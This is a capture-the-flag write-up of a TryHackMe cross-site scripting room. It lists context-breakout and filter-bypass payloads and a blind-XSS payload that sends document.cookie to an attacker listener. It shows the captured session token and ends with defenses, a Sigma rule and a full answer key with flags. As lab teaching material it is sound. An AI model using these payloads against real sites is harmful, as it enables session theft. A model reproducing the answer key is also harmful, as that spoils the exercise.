# Comprehensive Technical Room Guide: Intro to Cross-site Scripting (XSS)

---

## Section 01: Room Overview & Metadata

| Metadata Field | Technical Specification |
| :--- | :--- |
| **Room Title** | Intro to Cross-site Scripting (XSS) |
| **Learning Path** | Jr Penetration Tester (PT1 Aligned Curriculum) |
| **Module** | Web Application Vulnerabilities I (Module 07) |
| **Room Slug** | `xss` (Direct URL: `https://tryhackme.com/room/xss`) |
| **Difficulty Level** | Easy |
| **Room Type** | Walkthrough & Practical Laboratory |
| **Estimated Completion Time** | 30 Minutes |
| **Total Tasks** | 8 Interactive Tasks |
| **Target Application** | Interactive Evasion Sandbox & Acme IT Support Helpdesk |
| **User Completion Status** | 100% Completed (Verified live on TryHackMe platform) |

---

## Section 02: Educational & Operational Objectives

1. **Understand Client-Side Script Injection:** Master how Cross-Site Scripting (XSS) allows attackers to execute arbitrary JavaScript within a victim's browser session inside the trusted application origin.
2. **Differentiate the Core XSS Paradigms:**
   - **Reflected XSS:** Non-persistent reflection of untrusted URL `parameters`.
   - **Stored XSS:** Permanent persistence of malicious scripts within backend application `database` stores.
   - **DOM-Based XSS:** Pure client-side data flows from untrusted sources into dangerous execution sinks such as `eval()`.
3. **Master Blind XSS Testing:** Identify and exploit vulnerabilities in private administrative or moderation queues where execution cannot be observed directly, utilizing Out-of-Band (OOB) callback tools like `XSS Hunter Express` and Netcat listeners.
4. **Context Escaping & Filter Bypass Mastery:** Systematically break out of HTML contexts (Body, Attributes, Textareas, Inline Scripts) and bypass keyword filters and angle-bracket restrictions across six escalating levels.
5. **Session Hijacking Mechanics:** Extract sensitive session tokens from `document.cookie`, apply Base64 encoding for safe HTTP transport, and capture tokens via remote network listeners.
6. **Apply Modern Defensive Controls:** Implement Content Security Policy (CSP), Context-Aware Output Encoding, DOMPurify sanitization, and the `HttpOnly` cookie flag.

---

## Section 03: Target Architecture & Network Topology

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                                    NETWORK TOPOLOGY DIAGRAM                             |
|                                                                                         |
|      [ Public Internet / Untrusted ]                       [ Internal Corporate Zone ]  |
|                                                                                         |
|    +─────────────────────────────────+                   +───────────────────────────+  |
|    |      Attacker / Penetration     |                   |    Acme IT Support Staff  |  |
|    |        Tester Platform          |                   |     (Internal Browser)    |  |
|    |─────────────────────────────────|                   |───────────────────────────|  |
|    | IP: 10.10.X.Y                   |                   | IP: Internal Network      |  |
|    | Listener: nc -nlvp 9001         |                   | Holds: staff-session      |  |
|    +─────────────────────────────────+                   +───────────────────────────+  |
|                     │                                                  ▲                |
|  1. Submits Ticket  │                                                  │                |
|     with Payload    ▼                                                  │ 3. Staff Views |
|    +─────────────────────────────────+                                 │    Ticket      |
|    |     Public Web Portal (Acme)    |                                 │    (Triggers   |
|    |─────────────────────────────────|                                 │     XSS DOM)   |
|    | Port: 80 / 8080                 |                                 │                |
|    | Endpoint: /create_ticket.php    |                                 │                |
|    | DB: MySQL (Persists Payload)    |─────────────────────────────────┘                |
|    +─────────────────────────────────+                                                  |
|                     ▲                                                                   |
|                     │ 4. Out-of-Band Exfiltration Callback                              |
|                     │    GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIz...                       |
|                     └───────────────────────────────────────────────────────────────────┘
+─────────────────────────────────────────────────────────────────────────────────────────+
```

---

## Section 04: Prerequisites, Tooling & Environment Setup

### 1. Prerequisite Knowledge:
- Working understanding of HTTP client-server interaction models.
- Practical knowledge of JavaScript DOM manipulation (`document.cookie`, `window.location`).
- Familiarity with network listening utilities (`nc`, `python3 -m http.server`) and Linux command-line data processing (`base64`).

### 2. Setting Up Attack Infrastructure:
```bash
# Start Netcat listener on port 9001 to catch incoming Out-of-Band callbacks:
nc -nlvp 9001

# Test base64 decoding pipeline locally:
echo "c3RhZmYtc2Vzc2lvbj10ZXN0" | base64 -d
```

---

## Section 05: Theoretical Deep Dive

### 1. The Core Nature of XSS:
Cross-Site Scripting (XSS) is a client-side code injection vulnerability. Attackers inject executable scripts into benign web applications. When an unsuspecting user navigates to the affected page, the browser interprets the script as trusted application code, executing it with full access to the user's origin context.

### 2. Comparative Matrix of XSS Types:

| Attribute | Reflected XSS | Stored XSS | DOM-Based XSS |
| :--- | :--- | :--- | :--- |
| **Storage Location** | None (Transient) | Server Database / File Store | Client-side DOM Memory |
| **Delivery Mechanism** | Socially engineered URL with crafted query parameters | Normal navigation to infected page (Zero-click) | URL Fragment (`#`) or local storage source |
| **Server Participation** | Server reflects payload in response body | Server stores and redistributes payload | Server is completely unaware / blind |
| **Severity Tier** | Medium to High | Critical | High |

### 3. DOM-Based XSS Mechanics: Sources and Sinks
DOM XSS occurs exclusively within the browser when an untrusted input **Source** (such as `location.hash` or `location.search`) reaches an execution **Sink** (such as `eval()`, `document.write()`, or `element.innerHTML`) without prior sanitization.

---

## Section 06: Reconnaissance & Attack Surface Mapping

When assessing web applications for Cross-Site Scripting:

1. **Cataloging User-Controlled Input Points:**
   - URL query parameters (`?q=`, `?search=`, `?page=`, `?msg=`).
   - Persistent web form inputs (Comments, bios, usernames, feedback, support tickets).
   - HTTP Request Headers (`User-Agent`, `Referer`, `X-Forwarded-For`).
2. **Determining Reflection Context:**
   - Raw HTML body context: `<div>[INPUT]</div>`
   - Quoted attribute context: `<input value="[INPUT]">`
   - Enclosed block tag context: `<textarea>[INPUT]</textarea>`
   - Inline script execution context: `<script>var name = '[INPUT]';</script>`
3. **Filter Character Probing:**
   - Inject canary characters: `' " < > / ; ( ) { } \`.
   - Check whether characters are stripped, URL-encoded, or converted to HTML entities.

---

## Section 07: Vulnerability Analysis & Root Cause

### 1. Interactive Evasion Sandbox (Task 07):
- **Root Cause:** Absence of context-aware output encoding.
- In attribute contexts (`<input value="...">`), omitting attribute quotes allows breaking out with `">`.
- In Level 5, relying on non-recursive string stripping (`str_replace("script", "", $input)`) fails because nested strings (`<sscriptcript>`) collapse into valid script tags.
- In Level 6, sanitizing `< >` fails because event handlers (`onload=`, `onerror=`) can execute JavaScript directly from within the host tag attribute.

### 2. Acme IT Support Portal (Task 08):
- **Root Cause:** Reflecting ticket descriptions inside `<textarea>` elements without escaping closing tags (`</textarea>`), combined with the failure to configure the `HttpOnly` flag on the sensitive `staff-session` cookie.

---

## Section 08: Step-by-Step Exploitation & Flag Capture

### Scenario 1: Solving the Six Evasion Levels (Task 07)

```
[Level 1: Body Context]         ==> <script>alert('THM');</script>
[Level 2: Input Value Context]  ==> "><script>alert('THM');</script>
[Level 3: Textarea Context]     ==> </textarea><script>alert('THM');</script>
[Level 4: Inline Script Context]==> ';alert('THM');//
[Level 5: Strip Filter Context] ==> <sscriptcript>alert('THM');</sscriptcript>
[Level 6: Img Attribute Context]==> /images/cat.jpg" onload="alert('THM');
```

Upon successfully executing the payload in Level 6, the application displays the master flag:
> **Level 6 Master Flag:** `THM{XSS_MASTER}`

---

### Scenario 2: Blind XSS Exploitation & Staff Session Theft (Task 08)

1. Launch a Netcat listener on your attack machine:
   ```bash
   nc -nlvp 9001
   ```
2. Navigate to Acme IT Support, register an account, and open the ticket creation page.
3. Submit the ticket with the textarea breakout and Base64-encoded cookie exfiltration payload:
   ```html
   </textarea><script>fetch('http://10.10.X.Y:9001?cookie=' + btoa(document.cookie) );</script>
   ```
4. Wait 30-45 seconds for the automated staff bot to review the ticket queue.
5. Netcat captures the incoming HTTP GET callback:
   ```http
   GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
   Host: 10.10.X.Y:9001
   User-Agent: Mozilla/5.0 ...
   ```
6. Decode the exfiltrated cookie via terminal:
   ```bash
   echo "c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==" | base64 -d
   # Decoded output: staff-session=4AB305E55955197693F01D6F8FD2D321
   ```
> **Staff Session Cookie:** `4AB305E55955197693F01D6F8FD2D321`

---

## Section 09: Defense-in-Depth & Hardening Strategies

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                           DEFENSE-IN-DEPTH REMEDIATION MODEL                            |
|                                                                                         |
|  [ Layer 1: Context-Aware Output Encoding ]                                             |
|  - Convert special characters to HTML entities (&lt;, &gt;, &amp;, &quot;, &#x27;).     |
|  - Employ robust client-side sanitizers (e.g. DOMPurify) for rich HTML input.           |
|                                                                                         |
|  [ Layer 2: Strict Content Security Policy (CSP) ]                                      |
|  - Enforce: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...'  |
|  - Ban `'unsafe-inline'` and `'unsafe-eval'` directives.                                |
|                                                                                         |
|  [ Layer 3: Sensitive Cookie Protection (HttpOnly Flag) ]                               |
|  - Enforce the `HttpOnly` flag on all session cookies to prevent access via             |
|    `document.cookie`. Combine with `Secure` and `SameSite=Strict`.                      |
+─────────────────────────────────────────────────────────────────────────────────────────+
```

---

## Section 10: Detection, Threat Hunting & SIEM Rules

### 1. Web Access Log Inspection:
```bash
# Grep for encoded script tags and event handlers in web server access logs:
grep -E "(%3C|<).*script.*(%3E|>)|onload=|onerror=|eval\(" /var/log/apache2/access.log
```

### 2. Sigma Detection Rule:
```yaml
title: Potential Cross-Site Scripting Injection in URI
id: 3c5e8b1a-9f2d-4e7a-a1b4-28c3d7e50b89
status: stable
description: Detects typical XSS injection patterns within HTTP URI query strings.
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - '<script'
      - '%3Cscript'
      - 'onerror='
      - 'onload='
      - 'javascript:'
      - 'document.cookie'
  condition: selection
fields:
  - c-ip
  - cs-method
  - cs-uri-stem
  - cs-uri-query
level: high
```

---

## Section 11: Common Pitfalls & Troubleshooting

1. **Relying on Keyword Blacklists:**
   - *Pitfall:* Stripping `<script>` tags only.
   - *Reality:* Attackers execute JavaScript through dozens of alternative HTML tags (`<img>`, `<svg>`, `<body>`, `<iframe>`) using event handlers (`onload`, `onerror`, `onfocus`).
2. **Missing `HttpOnly` Cookie Attributes:**
   - *Pitfall:* Assuming XSS prevention is 100% foolproof and omitting cookie hardening.
   - *Reality:* If an XSS vulnerability occurs, the `HttpOnly` flag completely blocks session cookie theft via `document.cookie`.
3. **Improper Breakout in Script Blocks:**
   - *Pitfall:* Injecting `<script>` inside an existing `<script>` variable.
   - *Reality:* Causes syntax errors. Break out of string literals using `'; alert(1); //`.

---

## Section 12: Real-World Case Studies & CVE Mapping

1. **The Samy Worm on MySpace (2005):**
   - Stored XSS worm that infected over one million profiles in less than 24 hours by forcing visiting browsers to replicate the payload.
2. **Steam Chat Stored XSS ($7,500 Reward):**
   - Zero-click Stored XSS in the Steam chat client triggered simply by viewing an incoming message.
3. **Standard Classifications:**
   - **CWE-79:** Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').
   - **OWASP Top 10:2021:** A03:2021 - Injection.

---

## Section 13: Summary & Answers Matrix

| Task Number | Focus Concept | Platform Question | Final Accepted Answer |
| :--- | :--- | :--- | :--- |
| **Task 01** | Core Acronym | What does XSS stand for? | `Cross-Site Scripting` |
| **Task 02** | Session Property | Which document property could contain user's session token? | `document.cookie` |
| | PoC Method | Which JavaScript method is often used as a Proof Of Concept? | `alert` |
| **Task 03** | Reflected Vector | Where in an URL is a good place to test for reflected XSS? | `parameters` |
| **Task 04** | Stored Storage | How are stored XSS payloads usually stored on a website? | `database` |
| **Task 05** | DOM Sinks | What unsafe JavaScript method is good to look for in source code? | `eval()` |
| **Task 06** | Blind XSS Tool | What tool can you use to test for Blind XSS? | `XSS Hunter Express` |
| | Taxonomy | What type of XSS is very similar to Blind XSS? | `Stored XSS` |
| **Task 07** | Evasion Flag | What is the flag you received from level six? | `THM{XSS_MASTER}` |
| **Task 08** | Practical Flag | What is the value of the staff-session cookie? | `4AB305E55955197693F01D6F8FD2D321` |

---

## Section 14: Practical Exercises & Challenge Extensions

1. **Exercise 1: Crafting an XSS Polyglot:**
   - Design a single polyglot payload capable of executing across HTML body, input attributes, and inline script contexts simultaneously.
2. **Exercise 2: CSP Bypass Lab:**
   - Set up a test application protected by a strict CSP policy and attempt bypasses via JSONP endpoints and script gadget exploitation.
3. **Exercise 3: Automated DOM Source/Sink Scanner:**
   - Write a Python script to scan client-side JavaScript files and map data flows from sources (`location.hash`) to sinks (`eval`, `innerHTML`).
